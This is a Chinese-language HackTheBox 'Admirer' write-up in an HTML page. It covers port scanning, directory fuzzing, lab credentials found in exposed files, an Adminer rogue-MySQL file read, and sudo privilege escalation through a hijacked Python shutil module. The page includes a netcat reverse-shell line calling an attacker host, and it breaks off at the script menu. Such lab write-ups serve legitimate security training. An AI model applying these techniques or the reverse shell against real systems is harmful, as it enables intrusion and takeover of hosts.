@@ -1,0 +1,1182 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      <link rel="shortcut icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.1.0">
+    
+    
+      
+        <title>HackTheBox Admirer靶机 - Lukhap's Blog</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.bc7e593a.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab28b872.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#546d78">
+        
+      
+    
+    
+    
+      
+        
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>body,input{font-family:"Roboto",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono",SFMono-Regular,Consolas,Menlo,monospace}</style>
+      
+    
+    
+    
+    
+      
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="blue-grey" data-md-color-accent="pink">
+      
+  
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#htb-admirer" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid" aria-label="Header">
+    <a href="../.." title="Lukhap&#39;s Blog" class="md-header-nav__button md-logo" aria-label="Lukhap's Blog">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    <label class="md-header-nav__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header-nav__title" data-md-component="header-title">
+      
+        <div class="md-header-nav__ellipsis">
+          <span class="md-header-nav__topic md-ellipsis">
+            Lukhap's Blog
+          </span>
+          <span class="md-header-nav__topic md-ellipsis">
+            
+              HackTheBox Admirer靶机
+            
+          </span>
+        </div>
+      
+    </div>
+    
+      <label class="md-header-nav__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active">
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+
+  
+
+<nav class="md-tabs md-tabs--active" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  <li class="md-tabs__item">
+    
+      <a href="../.." class="md-tabs__link">
+        Home
+      </a>
+    
+  </li>
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../HTB-Blunder/" class="md-tabs__link md-tabs__link--active">
+          靶场
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../web/%E6%96%87%E4%BB%B6%E7%9A%84%E5%8C%85%E5%90%AB%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/" class="md-tabs__link">
+          web安全
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../vulns/avms/avms_bypass/" class="md-tabs__link">
+          漏洞
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    
+    
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../ctf/pwn/%E6%A0%88%E5%9F%BA%E7%A1%80/" class="md-tabs__link">
+          CTF
+        </a>
+      
+    </li>
+  
+
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../python/re%E7%9A%84%E5%87%A0%E7%A7%8D%E7%94%A8%E6%B3%95/" class="md-tabs__link">
+          Python
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../tunnel/隐蔽隧道.md" class="md-tabs__link">
+          后渗透
+        </a>
+      
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Lukhap&#39;s Blog" class="md-nav__button md-logo" aria-label="Lukhap's Blog">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    Lukhap's Blog
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../.." class="md-nav__link">
+      Home
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
+    
+    <label class="md-nav__link" for="nav-2">
+      靶场
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="靶场" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        <span class="md-nav__icon md-icon"></span>
+        靶场
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../HTB-Blunder/" class="md-nav__link">
+      HackTheBox Blunder靶机
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        HackTheBox Admirer靶机
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+    
+    <a href="./" class="md-nav__link md-nav__link--active">
+      HackTheBox Admirer靶机
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#0x01-nmap-scan" class="md-nav__link">
+    0x01 nmap scan
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x02" class="md-nav__link">
+    0x02 目录遍历
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x03-ftp" class="md-nav__link">
+    0x03 FTP
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x04-utility-scripts" class="md-nav__link">
+    0x04 utility-scripts目录
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x05" class="md-nav__link">
+    0x05 漏洞利用
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x06" class="md-nav__link">
+    0x06 提权
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../HTB-Luanne/" class="md-nav__link">
+      HackTheBox Luanne靶机
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../HTB-Academy/" class="md-nav__link">
+      HackTheBox Academy靶机
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../VulnStack-1/" class="md-nav__link">
+      VulnStack靶机(一)
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
+    
+    <label class="md-nav__link" for="nav-3">
+      web安全
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="web安全" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        <span class="md-nav__icon md-icon"></span>
+        web安全
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../web/%E6%96%87%E4%BB%B6%E7%9A%84%E5%8C%85%E5%90%AB%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/" class="md-nav__link">
+      文件包含
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
+    
+    <label class="md-nav__link" for="nav-4">
+      漏洞
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="漏洞" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        <span class="md-nav__icon md-icon"></span>
+        漏洞
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../vulns/avms/avms_bypass/" class="md-nav__link">
+      avms系统登录绕过
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
+    
+    <label class="md-nav__link" for="nav-5">
+      CTF
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="CTF" data-md-level="1">
+      <label class="md-nav__title" for="nav-5">
+        <span class="md-nav__icon md-icon"></span>
+        CTF
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-5-1" type="checkbox" id="nav-5-1">
+    
+    <label class="md-nav__link" for="nav-5-1">
+      PWN
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="PWN" data-md-level="2">
+      <label class="md-nav__title" for="nav-5-1">
+        <span class="md-nav__icon md-icon"></span>
+        PWN
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../ctf/pwn/%E6%A0%88%E5%9F%BA%E7%A1%80/" class="md-nav__link">
+      栈基础
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-5-2" type="checkbox" id="nav-5-2">
+    
+    <label class="md-nav__link" for="nav-5-2">
+      Web
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Web" data-md-level="2">
+      <label class="md-nav__title" for="nav-5-2">
+        <span class="md-nav__icon md-icon"></span>
+        Web
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../ctf/web/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/" class="md-nav__link">
+      2019-强网杯-随便注
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../ctf/web/buuctf-excrcise/" class="md-nav__link">
+      buuctf-web题练习1
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../ctf/web/buuctf-excrcise2/" class="md-nav__link">
+      buuctf-web题练习2
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../ctf/web/buuctf-excrcise3/" class="md-nav__link">
+      buuctf-web题练习3
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6">
+    
+    <label class="md-nav__link" for="nav-6">
+      Python
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Python" data-md-level="1">
+      <label class="md-nav__title" for="nav-6">
+        <span class="md-nav__icon md-icon"></span>
+        Python
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../python/re%E7%9A%84%E5%87%A0%E7%A7%8D%E7%94%A8%E6%B3%95/" class="md-nav__link">
+      re的几种用法
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-7" type="checkbox" id="nav-7">
+    
+    <label class="md-nav__link" for="nav-7">
+      后渗透
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="后渗透" data-md-level="1">
+      <label class="md-nav__title" for="nav-7">
+        <span class="md-nav__icon md-icon"></span>
+        后渗透
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../tunnel/隐蔽隧道.md" class="md-nav__link">
+      隐蔽隧道
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#0x01-nmap-scan" class="md-nav__link">
+    0x01 nmap scan
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x02" class="md-nav__link">
+    0x02 目录遍历
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x03-ftp" class="md-nav__link">
+    0x03 FTP
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x04-utility-scripts" class="md-nav__link">
+    0x04 utility-scripts目录
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x05" class="md-nav__link">
+    0x05 漏洞利用
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x06" class="md-nav__link">
+    0x06 提权
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                <h1 id="htb-admirer">HTB-Admirer<a class="headerlink" href="#htb-admirer" title="Permanent link">&para;</a></h1>
+<h2 id="0x01-nmap-scan">0x01 nmap scan<a class="headerlink" href="#0x01-nmap-scan" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>nmap -sS -Pn -T4 -n --open -p- 10.10.10.187
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+</code></pre></div>
+<h2 id="0x02">0x02 目录遍历<a class="headerlink" href="#0x02" title="Permanent link">&para;</a></h2>
+<ul>
+<li>robots.txt</li>
+</ul>
+<div class="highlight"><pre><span></span><code>User-agent: *
+
+# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
+Disallow: /admin-dir
+</code></pre></div>
+<ul>
+<li>
+<p>dirsearch未发现可疑</p>
+</li>
+<li>
+<p>使用wfuzz遍历</p>
+</li>
+</ul>
+<div class="highlight"><pre><span></span><code>wfuzz -c -z file,/usr/share/dirb/wordlists/big.txt -z list,html-txt-php --hc 404,403 -u http://10.10.10.187/admin-dir/FUZZ.FUZ2Z -t 100
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>===================================================================
+ID           Response   Lines    Word     Chars       Payload                                     
+===================================================================
+
+000015593:   200        29 L     39 W     350 Ch      &quot;contacts - txt&quot;                            
+000016328:   200        11 L     13 W     136 Ch      &quot;credentials - txt&quot;
+</code></pre></div>
+<ul>
+<li>contacts.txt文件的内容是</li>
+</ul>
+<div class="highlight"><pre><span></span><code>##########
+# admins #
+##########
+# Penny
+Email: p.wise@admirer.htb
+
+
+##############
+# developers #
+##############
+# Rajesh
+Email: r.nayyar@admirer.htb
+
+# Amy
+Email: a.bialik@admirer.htb
+
+# Leonard
+Email: l.galecki@admirer.htb
+
+
+
+#############
+# designers #
+#############
+# Howard
+Email: h.helberg@admirer.htb
+
+# Bernadette
+Email: b.rauch@admirer.htb
+</code></pre></div>
+<ul>
+<li>credentials.txt文件内容</li>
+</ul>
+<p>```
+[Internal mail account]
+  <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#119;&#46;&#99;&#111;&#111;&#112;&#101;&#114;&#64;&#97;&#100;&#109;&#105;&#114;&#101;&#114;&#46;&#104;&#116;&#98;">&#119;&#46;&#99;&#111;&#111;&#112;&#101;&#114;&#64;&#97;&#100;&#109;&#105;&#114;&#101;&#114;&#46;&#104;&#116;&#98;</a>
+  fgJr6q#S\W:$P</p>
+<p>[FTP account]
+  ftpuser
+  %n?4Wz}R$tTF7</p>
+<p>[Wordpress account]
+  admin
+  w0rdpr3ss01!
+  ```</p>
+<h2 id="0x03-ftp">0x03 FTP<a class="headerlink" href="#0x03-ftp" title="Permanent link">&para;</a></h2>
+<ul>
+<li>credentials.txt文件中存在ftp账号密码:ftpuser:%n?4Wz}R$tTF7</li>
+</ul>
+<div class="highlight"><pre><span></span><code>root@kali:~# ftp 10.10.10.187
+Connected to 10.10.10.187.
+220 (vsFTPd 3.0.3)
+Name (10.10.10.187:root): ftpuser
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0            3405 Dec 02  2019 dump.sql
+-rw-r--r--    1 0        0         5270987 Dec 03  2019 html.tar.gz
+226 Directory send OK.
+</code></pre></div>
+<ul>
+<li>
+<p>下载html.tar.gz和dump.sql文件，解压后查看</p>
+</li>
+<li>
+<p>html主要目录结构如图：</p>
+</li>
+</ul>
+<p><img alt="image-20200909100926488" src="../images/HTB-Admirer/image-20200909100926488.png" /></p>
+<ul>
+<li>db_admin.php存在数据库账号密码</li>
+</ul>
+<div class="highlight"><pre><span></span><code>$servername = &quot;localhost&quot;;
+$username = &quot;waldo&quot;;
+$password = &quot;]F7jLHw:*G&gt;UPrTo}~A&quot;d6b&quot;;
+$dbname = &quot;admirerdb&quot;;
+</code></pre></div>
+<h2 id="0x04-utility-scripts">0x04 utility-scripts目录<a class="headerlink" href="#0x04-utility-scripts" title="Permanent link">&para;</a></h2>
+<ul>
+<li>扫描utility-scripts目录</li>
+</ul>
+<div class="highlight"><pre><span></span><code>python3 dirsearch/dirsearch.py -u http://10.10.10.187/utility-scripts/ -e * -i 200
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>[22:24:45] Starting: 
+[22:25:13] 200 -    4KB - /utility-scripts/adminer.php                                                      
+[22:25:42] 200 -   83KB - /utility-scripts/info.php
+</code></pre></div>
+<ul>
+<li>发现adminer.php文件</li>
+</ul>
+<p><img alt="image-20200909103817779" src="../images/HTB-Admirer/image-20200909103817779.png" /></p>
+<h2 id="0x05">0x05 漏洞利用<a class="headerlink" href="#0x05" title="Permanent link">&para;</a></h2>
+<ul>
+<li>
+<p>adminer数据库管理页面 4.6.2版本存在漏洞</p>
+</li>
+<li>
+<p>具体漏洞详情，<a href="https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool">见此</a></p>
+</li>
+<li>
+<p>该漏洞主要是adminer.php可以外连任意数据库导致</p>
+</li>
+<li>
+<p>在自己本地机器创建test用户以及admirer数据库和数据表</p>
+</li>
+<li>
+<p>本地启动mysql服务</p>
+</li>
+<li>
+<p>在adminer页面连接自己启动的数据库</p>
+</li>
+</ul>
+<p><img alt="image-20200909112916052" src="../images/HTB-Admirer/image-20200909112916052.png" /></p>
+<ul>
+<li>成功登录</li>
+</ul>
+<p><img alt="image-20200909113035803" src="../images/HTB-Admirer/image-20200909113035803.png" /></p>
+<ul>
+<li>
+<p>通过adminer.php读取文件</p>
+</li>
+<li>
+<p>在之前发现info.php文件中发现open_basedir限制，只能读取/var/www/html目录下的文件</p>
+</li>
+<li>
+<p>尝试读取index.php文件，并存入test表</p>
+</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="k">load</span> <span class="k">data</span> <span class="k">local</span> <span class="n">infile</span> <span class="s1">&#39;./index.php&#39;</span>
+<span class="n">info</span> <span class="k">table</span> <span class="n">test</span>
+<span class="n">fields</span> <span class="n">terminated</span> <span class="k">by</span> <span class="ss">&quot;/n&quot;</span>
+</code></pre></div>
+<p><img alt="image-20200909114609230" src="../images/HTB-Admirer/image-20200909114609230.png" /></p>
+<ul>
+<li>查询test表内容</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test</span>
+</code></pre></div>
+<p><img alt="image-20200909114638567" src="../images/HTB-Admirer/image-20200909114638567.png" /></p>
+<ul>
+<li>在index.php中发现如下账号密码</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="x">$servername = &quot;localhost&quot;;</span>
+<span class="x">$username = &quot;waldo&quot;;</span>
+<span class="x">$password = &quot;&amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;&quot;;</span>
+<span class="x">$dbname = &quot;admirerdb&quot;;</span>
+</code></pre></div>
+<ul>
+<li>尝试使用该密码登录ssh</li>
+</ul>
+<p><img alt="image-20200909115104989" src="../images/HTB-Admirer/image-20200909115104989.png" /></p>
+<h2 id="0x06">0x06 提权<a class="headerlink" href="#0x06" title="Permanent link">&para;</a></h2>
+<ul>
+<li>sudo -l</li>
+</ul>
+<div class="highlight"><pre><span></span><code>waldo@admirer:~$ sudo -l
+<span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> waldo: 
+Matching Defaults entries <span class="k">for</span> waldo on admirer:
+    env_reset, <span class="nv">env_file</span><span class="o">=</span>/etc/sudoenv, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin, <span class="nv">listpw</span><span class="o">=</span>always
+
+User waldo may run the following commands on admirer:
+    <span class="o">(</span>ALL<span class="o">)</span> SETENV: /opt/scripts/admin_tasks.sh
+</code></pre></div>
+<ul>
+<li>查看/opt/scripts/admin_tasks.sh文件</li>
+</ul>
+<div class="highlight"><pre><span></span><code>backup_web<span class="o">()</span>
+<span class="o">{</span>
+    <span class="k">if</span> <span class="o">[</span> <span class="s2">&quot;</span><span class="nv">$EUID</span><span class="s2">&quot;</span> -eq <span class="m">0</span> <span class="o">]</span>
+    <span class="k">then</span>
+        <span class="nb">echo</span> <span class="s2">&quot;Running backup script in the background, it might take a while...&quot;</span>
+        /opt/scripts/backup.py <span class="p">&amp;</span>
+    <span class="k">else</span>
+        <span class="nb">echo</span> <span class="s2">&quot;Insufficient privileges to perform the selected operation.&quot;</span>
+    <span class="k">fi</span>
+<span class="o">}</span>
+</code></pre></div>
+<ul>
+<li>
+<p>其中backup_web()函数调用执行了/opt/scripts/backup.py脚本</p>
+</li>
+<li>
+<p>backup.py的内容为</p>
+</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/python3</span>
+
+<span class="kn">from</span> <span class="nn">shutil</span> <span class="kn">import</span> <span class="n">make_archive</span>
+
+<span class="n">src</span> <span class="o">=</span> <span class="s1">&#39;/var/www/html/&#39;</span>
+
+<span class="c1"># old ftp directory, not used anymore</span>
+<span class="c1">#dst = &#39;/srv/ftp/html&#39;</span>
+
+<span class="n">dst</span> <span class="o">=</span> <span class="s1">&#39;/var/backups/html&#39;</span>
+
+<span class="n">make_archive</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;gztar&#39;</span><span class="p">,</span> <span class="n">src</span><span class="p">)</span>
+</code></pre></div>
+<ul>
+<li>
+<p>通过python库劫持来提权，脚本调用了shutil库</p>
+</li>
+<li>
+<p>查询python库路径</p>
+</li>
+</ul>
+<div class="highlight"><pre><span></span><code>waldo@admirer:~$ python3 -c <span class="s1">&#39;import sys;print(&quot;\n&quot;.join(sys.path))&#39;</span>
+
+/usr/lib/python35.zip
+/usr/lib/python3.5
+/usr/lib/python3.5/plat-x86_64-linux-gnu
+/usr/lib/python3.5/lib-dynload
+/usr/local/lib/python3.5/dist-packages
+/usr/lib/python3/dist-packages
+</code></pre></div>
+<ul>
+<li>在/tmp/pypath目录下伪造shutil.py文件</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">pypath</span>
+<span class="n">waldo</span><span class="nd">@admirer</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">pypath</span><span class="err">$</span> <span class="n">cat</span> <span class="n">shutil</span><span class="o">.</span><span class="n">py</span> 
+<span class="kn">import</span> <span class="nn">os</span>
+
+<span class="k">def</span> <span class="nf">make_archive</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">):</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;nc 10.10.15.58 80 -e &#39;/bin/bash&#39;&quot;</span><span class="p">)</span>
+</code></pre></div>
+<ul>
+<li>通过pythonpath指定库路径，并执行</li>
+</ul>
+<p><div class="highlight"><pre><span></span><code>waldo@admirer:/tmp/pypath$ sudo <span class="nv">PYTHONPATH</span><span class="o">=</span>/tmp/pypath /opt/scripts/admin_tasks.sh
+
+<span class="o">[[[</span> System Administration Menu <span class="o">]]]</span>
+<span class="m">1</span><span class="o">)</span> View system uptime
